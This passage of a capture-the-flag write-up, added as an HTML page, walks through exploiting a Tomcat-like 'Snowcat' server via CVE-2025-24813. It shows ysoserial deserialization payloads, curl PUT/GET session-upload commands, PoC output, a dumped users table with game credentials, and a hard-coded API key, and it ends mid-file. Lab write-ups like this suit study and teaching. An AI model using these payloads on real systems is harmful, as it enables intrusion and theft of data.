@@ -1,0 +1,802 @@
+<div class="kc-section kc-section--hack-a-gnome" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Snowcat RCE & Priv Esc</h1>
+  
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">Hotel (NetWars)</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Tom Hessman Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="tomhessman-avatar.gif"
+             alt="Chris Davis avatar">
+        <div class="kc-convo-name">Tom Hessman</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          Hi, I'm Tom! I've worked for Counter Hack since its founding in 2010.
+        </p>
+        <p>
+          I love all things testing and QA, maintaining systems, logistics, and helping our customers have the best possible experience.
+        </p>
+        <p>
+          Outside of work, you'll find me at my local community theater producing shows, helping with sound or video, or just hanging around.
+        </p>
+        <p>
+          Learn more about my backround at TomHessman.com.
+        </p>
+        <p>
+          We've lost access to the neighborhood weather monitoring station.
+        </p>
+        <p>
+          There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing.
+        </p>
+        <p>
+          Can you help me exploit the vulnerabilities and retrieve the other application's authorization key?
+        </p>
+        <p>
+          Enter the other application's authorization key into the badge.
+        </p>
+        <p>
+          If Frosty's plan works and everything freezes over, our customers won't be having the best possible experience—they'll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="snowcat-rce">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Snowcat</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Snowcat RCE & Priv Esc</div>
+    <p>
+    Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.
+    </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Snowcat</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Snowcat RCE & Priv Esc</div>
+    <p>
+    If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.
+    </p>
+</div>
+
+<!-- Hint 3 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Snowcat</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Snowcat RCE & Priv Esc</div>
+    <p>
+    Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.
+    </p>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+<span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+</span>
+<span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+  Click on the Cranberry Pi terminal, we are greeted with the following.
+  </p>
+</div> 
+
+<div class="kc-terminal-header">
+  <span class="kc-terminal-icon">
+    <img src="cranpi.png" alt="Cranberry Pi terminal icon">
+  </span>
+  <span class="kc-terminal-title">Cranberry Pi Terminal</span>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text">We've lost control of the Neighborhood Weather Monitoring Station.
+We think another system is connecting.
+
+The weather monitoring station uses the Snowcat hosting platform.
+It's cousin Tomcat, recently had a Remote Code Execution vulnerability.
+Can you help me try and exploit it to regain access to the server?
+
+Once you've gained access, find a way to become the 'weather' user, and find the authorization key used by the other system.
+Enter the authorization key used by the other system into the badge.
+
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Doing some initial recon: Let’s start with some initial recon and check what files and tooling are already
+    available on the box. A quick directory listing (plus <code>id</code> to confirm our current user context)
+    shows we already have everything we need staged locally: a PoC script (<code>CVE-2025-24813.py</code>),
+    <code>ysoserial.jar</code> for generating Java gadget payloads, and a <code>notes.md</code> file that
+    outlines the intended exploit flow and even hints at a follow-on privilege escalation path.
+  </p>
+
+  <p>
+    The <code>notes.md</code> is especially helpful: it documents a PUT/GET pattern for dropping serialized session
+    data and then triggering deserialization via a session cookie — very “Tomcat-like,” which matches the challenge hint.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> id
+uid=2001(user) gid=2000(user) groups=2000(user)
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> ls
+CVE-2025-24813.py  notes.md  weather-jsps  ysoserial.jar
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> cat notes.md
+# Remote Code Execution exploiting RCE-2025-24813
+
+Snowcat is a webserver adapted to life in the arctic.
+Can you help me check to see if Snowcat is vulnerable to RCE-2025-24813 like its cousin Tomcat?
+
+## Display ysoserial help, lists payloads, and their dependencies:
+
+  java -jar ysoserial.jar
+
+
+## Identify what libraries are used by the Neighborhood Weather Monitoring system
+
+## Use ysoserial to generate a payload
+
+Store payload in file named payload.bin
+
+## Attempt to exploit RCE-2025-24813 to execute the payload
+
+
+export HOST=TODO_INSERT_HOST
+export PORT=TODO_INSERT_PORT
+export SESSION_ID=TODO_INSERT_SESSION_ID
+
+curl -X PUT \
+  -H "Host: ${HOST}:${PORT}" \
+  -H "Content-Length: $(wc -c &lt; payload.bin)" \
+  -H "Content-Range: bytes 0-$(($(wc -c &lt; payload.bin)-1))/$(wc -c &lt; payload.bin)" \
+  --data-binary @payload.bin \
+  "http://${HOST}:${PORT}/${SESSION_ID}/session"
+
+curl -X GET \
+  -H "Host: ${HOST}:${PORT}" \
+  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
+  "http://${HOST}:${PORT}/"
+
+
+
+# Privilege Escalation
+
+The Snowcat server still uses some C binaries from an older system iteration.
+Replacing these has been logged as technical debt.
+&lt;TOOD_INSERT_ELF_NAME&gt; said he thought these components might create a privilege escalation vulnerability.
+Can you prove these components are vulnerable by retrieving the key that is not used by the Snowcat hosted Neighborhood Weather Monitoring Station?</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    The hint that <strong>Snowcat is closely related to Tomcat</strong> suggests we may be able to reuse
+    familiar Java deserialization gadget chains. Since <code>ysoserial</code> is already present, we can
+    craft a quick RCE proof-of-concept payload using a CommonsCollections chain that copies the
+    server’s <code>weather.db</code> into <code>/tmp</code> (where we can grab it later).
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> java -jar ysoserial.jar CommonsCollections5 \
+  "cp /usr/local/snowcat/webapps/ROOT/WEB-INF/classes/weather.db /tmp/weather.dbcopy" \
+  &gt; payload_db_cp.bin
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> ls -l payload_db_cp.bin
+-rw-r--r-- 1 user user 2080 Dec 23 18:16 payload_db_cp.bin
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    With our serialized payload generated, the next step was to test delivery using the provided
+    <code>CVE-2025-24813.py</code> helper. The script performs two phases:
+    a <strong>PUT</strong> to upload session data, then a <strong>GET</strong> with the chosen session cookie
+    to force the server to deserialize it.
+  </p>
+
+  <p>
+    Interesting outcome: the PUT returns <strong>HTTP 409</strong> (Conflict), but the GET returns
+    <strong>HTTP 500</strong> with a Java stack trace — which can actually be a good sign. It shows the session
+    load path is being hit (<code>FileStore.load</code> / <code>PersistentManagerBase.swapIn</code>), meaning our
+    session cookie is triggering deserialization.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> python3 CVE-2025-24813.py --host 127.0.0.1 --port 80 \
+  --session-id dbcp \
+  --base64-payload "$(base64 -w0 payload_db_cp.bin)"
+[*] Sending PUT request with serialized session data...
+[PUT] Status: 409 
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 409 – Conflict&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 409 – Conflict&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The request could not be completed due to a conflict with the current state of the target resource.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+[*] Sending GET request with session cookie...
+[GET] Status: 500 
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)
+        org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1199)
+        org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:846)
+        org.apache.catalina.session.FileStore.load(FileStore.java:203)
+        org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:723)
+        org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:672)
+        org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:467)
+        org.apache.catalina.connector.Request.doGetSession(Request.java:2722)
+        org.apache.catalina.connector.Request.getSessionInternal(Request.java:2467)
+        org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:451)
+        org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+        org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:660)
+        org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)
+        org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:388)
+        org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+        org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:936)
+        org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+        org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+        org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
+        org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+        org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+        java.base/java.lang.Thread.run(Thread.java:829)
+&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    After copying <code>weather.db</code> into <code>/tmp</code>, we tried to read it as the low-privileged
+    <code>user</code> account — but the file was owned by <code>snowcat</code> and not world-readable, resulting
+    in <strong>Permission denied</strong>.
+  </p>
+
+  <p>
+    Since our earlier test confirmed we can trigger server-side execution via the Snowcat/Tomcat session
+    deserialization path, we generated a second payload to change the file permissions
+    (<code>chmod 644</code>) on the copied database. After re-triggering the session load, the permissions
+    were updated and the file became readable.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> cat /tmp/weather.dbcopy
+cat: /tmp/weather.dbcopy: Permission denied
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> java -jar ysoserial.jar CommonsCollections5 \
+  "chmod 644 /tmp/weather.dbcopy" \
+  &gt; payload_db_chmod.bin
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> python3 CVE-2025-24813.py --host 127.0.0.1 --port 80 \
+  --session-id dbchmod \
+  --base64-payload "$(base64 -w0 payload_db_chmod.bin)"
+[*] Sending PUT request with serialized session data...
+[PUT] Status: 409 
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 409 – Conflict&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 409 – Conflict&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The request could not be completed due to a conflict with the current state of the target resource.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+[*] Sending GET request with session cookie...
+[GET] Status: 500 
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)
+        org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1199)
+        org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:846)
+        org.apache.catalina.session.FileStore.load(FileStore.java:203)
+        org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:723)
+        org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:672)
+        org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:467)
+        org.apache.catalina.connector.Request.doGetSession(Request.java:2722)
+        org.apache.catalina.connector.Request.getSessionInternal(Request.java:2467)
+        org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:451)
+        org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
+        org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:660)
+        org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)
+        org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:388)
+        org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+        org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:936)
+        org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+        org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+        org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
+        org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+        org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+        java.base/java.lang.Thread.run(Thread.java:829)
+&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> ls -l /tmp/weather.dbcopy
+-rw-r--r-- 1 snowcat snowcat 12288 Dec 23 18:45 /tmp/weather.dbcopy
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    With a readable copy of <code>weather.db</code> in <code>/tmp</code>, the next step was to inspect the database
+    schema and look for anything authentication-related. Using <code>sqlite3</code>, we enumerated the tables and
+    dumped the contents of the <code>users</code> table.
+  </p>
+
+  <p>
+    The output shows a list of usernames alongside what appears to be password material (one entry is plainly readable:
+    <code>admin|W34therBC0ld!154!37!|Weather|Admin</code>). That’s a strong indicator we can authenticate directly as
+    <code>admin</code> (or use these creds later for privilege escalation to the <code>weather</code> user).
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> sqlite3 /tmp/weather.dbcopy ".tables"
+users
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> sqlite3 /tmp/weather.dbcopy "SELECT * FROM users;"
+users
+admin|W34therBC0ld!154!37!|Weather|Admin
+ed|eY5+6hJ9wDhE+Le9vi9JVIf5YP4OAWR7HfbRi5tG|Ed|S
+josh|YUCH+VOeVJzbt8qt5sPnYLssmz60rosUwS0LfRAR|Josh|W
+lynn|c3roIHsci3X1Dh7B7hdXtpfJcBWiQrxWqq9LrxOK|Lynn|S
+patrick|5kiKq4ebUWxxbhrEPji01QcV5kYUKin4zBSPiOcu|Patrick|C
+paul|5Pvf20wfDVXcQ9jgv96Z6k7EoGm28M8BeK1PKcat|Paul|B
+evan|4X07MTdPmk53RFFKBFZWyBovCnU6SkRDUNOLkWcE|Evan|B
+thomas|DndrOnRSN4Kw0S/mSqD87G6GqUmmCZMHzfM09/KB|Thomas|B
+chrisd|bT1sgRXrZEsIZytHMH7qhE51ieDPRwy+ML7Hnkc6|Chris|D
+mark|qJxO+4BBySvqbpxfmNv0+dxJlAR1uXvgYXOkb4Ns|Mark|D
+chrise|2useB6f9c14tlhqhrXOwSJj1FA2p5O7ywuHxpQL7|Chris|E
+jared|Hdd0ngscc5XP6B8qvsWiDsPi6D31jd6tCZd6Nkn0|Jared|F
+charlie|elrBun7XQdrj5nIXeZIVc+Ig11ESsTarl/tqlOBH|Charlie|G
+tom|rdv/5wQAA55PkJY45emvhb0lk2fGx4nJL7h/qJqN|Tom|H
+jj|aTYyYgbc3zSBPqJ7B2B2wQgyTRL4EpRw7Z0W6SqJ|Janusz|J
+kevin|anaEQN2ptzRrv6sN06aoYs3Nu4YjpG4nEE+DGCnC|Kevin|M
+torkel|fFZE44+eIcigZOoOuDwK7QqtBQNWhn/pp5tOE076|Torkel|O
+kyle|GDFysqKvLRV4dkXBCfImxlPtF/AxB0igkVyA6l8W|Kyle|P
+eric|OUQ1vSH7eZkZ/6UnImrMUqjK/FdFwzyfgqJrsxLM|Eric|P
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    These accounts might come in handy later, but for now let’s pivot back to the application itself and inspect
+    <code>dashboard.jsp</code> to understand how the weather data is being generated.
+  </p>
+
+  <p>
+    Right away we spot something juicy: the page spawns three local binaries
+    (<code>/usr/local/weather/temperature</code>, <code>/usr/local/weather/humidity</code>, and
+    <code>/usr/local/weather/pressure</code>) and passes a hard-coded UUID <em>key</em> as an argument. That key
+    looks exactly like the kind of “authorization key used by the other system” the challenge is asking us to recover,
+    and it also tells us where to focus next: those legacy C binaries.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> <span class="term-green">cat weather-jsps/dashboard.jsp</span>
+&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.commons.collections.map.*&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Neighborhood Weather Monitoring Station&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;dashboard-container&quot;&gt;
+    &lt;h1&gt;Neighborhood Weather Monitoring Station&lt;/h1&gt;
+    &lt;p&gt;Providing real-time Neighborhood weather monitoring since 2022.&lt;/p&gt;
+    &lt;%
+        if (session == null || session.getAttribute(&quot;username&quot;) == null) {
+            // No valid session, redirect to login page
+            response.sendRedirect(&quot;/&quot;);
+            return;
+        }
+        String username = (String) session.getAttribute(&quot;username&quot;);
+        String firstname = (String) session.getAttribute(&quot;firstname&quot;);
+        String lastname = (String) session.getAttribute(&quot;lastname&quot;);
+
+        out.println(&quot;&lt;h2&gt;Welcome, &quot; + firstname + &quot; &quot; + lastname + &quot;&lt;/h2&gt;&quot;);
+
+        try {
+            String key = &quot;<span class="term-yellow">4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</span>&quot;;
+            Process tempProc = Runtime.getRuntime().exec(&quot;/usr/local/weather/temperature &quot; + key);
+            Process humProc = Runtime.getRuntime().exec(&quot;/usr/local/weather/humidity &quot; + key);
+            Process presProc = Runtime.getRuntime().exec(&quot;/usr/local/weather/pressure &quot; + key);
+
+            BufferedReader tempReader = new BufferedReader(new InputStreamReader(tempProc.getInputStream()));
+            BufferedReader humReader = new BufferedReader(new InputStreamReader(humProc.getInputStream()));
+            BufferedReader presReader = new BufferedReader(new InputStreamReader(presProc.getInputStream()));
+
+            String tempLine = tempReader.readLine();
+            String humLine = humReader.readLine();
+            String presLine = presReader.readLine();
+        
+            if (tempLine == null || humLine == null || presLine == null) {
+                out.println(&quot;&lt;p&gt;Error: Unable to retrieve weather data. Please try again later.&lt;/p&gt;&quot;);
+                return;
+            }
+        
+            float temperature = Float.parseFloat(tempLine);
+            float humidity = Float.parseFloat(humLine);
+            int pressure = Integer.parseInt(presLine); // Parse pressure as integer
+
+            // Define min and max values using Apache Commons Collections MultiValueMap
+            MultiValueMap ranges = new MultiValueMap();
+
+            ranges.put(&quot;temperature&quot;, 70.0f);
+            ranges.put(&quot;temperature&quot;, -50.0f);
+
+            ranges.put(&quot;humidity&quot;, 100.0f);
+            ranges.put(&quot;humidity&quot;, 0.0f);
+
+            ranges.put(&quot;pressure&quot;, 950);
+            ranges.put(&quot;pressure&quot;, 1050);
+
+            // Retrieve min and max values for normalization
+            float tempMin = (float) ranges.getCollection(&quot;temperature&quot;).toArray()[0];
+            float tempMax = (float) ranges.getCollection(&quot;temperature&quot;).toArray()[1];
+
+            float humMin = (float) ranges.getCollection(&quot;humidity&quot;).toArray()[0];
+            float humMax = (float) ranges.getCollection(&quot;humidity&quot;).toArray()[1];
+
+            int presMin = (int) ranges.getCollection(&quot;pressure&quot;).toArray()[0];
+            int presMax = (int) ranges.getCollection(&quot;pressure&quot;).toArray()[1];
+
+            // Normalize values using the ranges
+            float normalizedTemperature = (temperature - tempMin) / (float) (tempMax - tempMin);
+            float normalizedHumidity = (humidity - humMin) / (humMax - humMin);
+            float normalizedPressure = (pressure - presMin) / (float) (presMax - presMin);
+
+            // Adjust weights based on normalized values for Kansas December weather
+            float tempScore = temperature &lt; 2.0f ? 1.0f : (temperature &lt; 6.0f ? 0.5f : 0.0f);
+            float humScore = humidity &gt; 70.0f ? 1.0f : (humidity &gt; 50.0f ? 0.5f : 0.0f);
+            float presScore = pressure &lt; 1015 ? 1.0f : (pressure &lt; 1025 ? 0.5f : 0.0f);
+            float likelihood = tempScore * 50 + humScore * 30 + presScore * 20;
